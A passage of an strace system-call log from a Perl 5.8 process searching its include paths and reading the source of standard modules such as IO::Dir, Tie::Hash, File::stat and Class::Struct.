$arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
6692  07:15:04.986342 _llseek(6, 1386, [1386], SEEK_SET) = 0
6692  07:15:04.989611 _llseek(6, 0, [1386], SEEK_CUR) = 0
6692  07:15:04.989620 close(6)          = 0
6692  07:15:04.989695 stat64("/etc/perl/IO/Dir.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.989711 stat64("/etc/perl/IO/Dir.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.989726 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.989739 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.989757 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.989771 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.989785 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.989797 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.989810 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.989823 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.989836 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.989849 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
6692  07:15:04.989871 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
6692  07:15:04.989885 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe790e8) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.989897 _llseek(6, 0, [0], SEEK_CUR) = 0
6692  07:15:04.989917 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
6692  07:15:04.990447 stat64("/etc/perl/Tie/Hash.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.990464 stat64("/etc/perl/Tie/Hash.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.990478 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.990491 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.990506 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.990519 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.990639 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.990665 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.990679 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.990691 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.990705 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.990717 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.990731 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.990744 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
6692  07:15:04.990766 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
6692  07:15:04.990780 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78c38) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.990792 _llseek(8, 0, [0], SEEK_CUR) = 0
6692  07:15:04.990812 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
6692  07:15:04.991148 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
6692  07:15:04.991736 read(8, "", 4096) = 0
6692  07:15:04.991754 close(8)          = 0
6692  07:15:04.991786 stat64("/etc/perl/File/stat.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.991803 stat64("/etc/perl/File/stat.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.991818 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.991831 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.991846 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.991860 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.991875 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.991887 stat64("/usr/lib/perl5/File/stat.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.991901 stat64("/usr/share/perl5/File/stat.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.991918 stat64("/usr/share/perl5/File/stat.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.991933 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.991947 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.991961 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.991975 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
6692  07:15:04.991997 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
6692  07:15:04.992013 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78c38) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.992026 _llseek(8, 0, [0], SEEK_CUR) = 0
6692  07:15:04.992044 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
6692  07:15:04.992498 stat64("/etc/perl/Class/Struct.pmc", 0xbfe78a6c) = -1 ENOENT (No such file or directory)
6692  07:15:04.992517 stat64("/etc/perl/Class/Struct.pm", 0xbfe7897c) = -1 ENOENT (No such file or directory)
6692  07:15:04.992531 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfe78a6c) = -1 ENOENT (No such file or directory)
6692  07:15:04.992545 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfe7897c) = -1 ENOENT (No such file or directory)
6692  07:15:04.992560 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfe78a6c) = -1 ENOENT (No such file or directory)
6692  07:15:04.992604 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfe7897c) = -1 ENOENT (No such file or directory)
6692  07:15:04.992620 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfe78a6c) = -1 ENOENT (No such file or directory)
6692  07:15:04.992646 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfe7897c) = -1 ENOENT (No such file or directory)
6692  07:15:04.992660 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfe78a6c) = -1 ENOENT (No such file or directory)
6692  07:15:04.992673 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfe7897c) = -1 ENOENT (No such file or directory)
6692  07:15:04.992686 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfe78a6c) = -1 ENOENT (No such file or directory)
6692  07:15:04.992699 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfe7897c) = -1 ENOENT (No such file or directory)
6692  07:15:04.992714 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfe78a6c) = -1 ENOENT (No such file or directory)
6692  07:15:04.992727 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
6692  07:15:04.992749 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
6692  07:15:04.992764 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78788) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.992776 _llseek(10, 0, [0], SEEK_CUR) = 0
6692  07:15:04.992795 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init 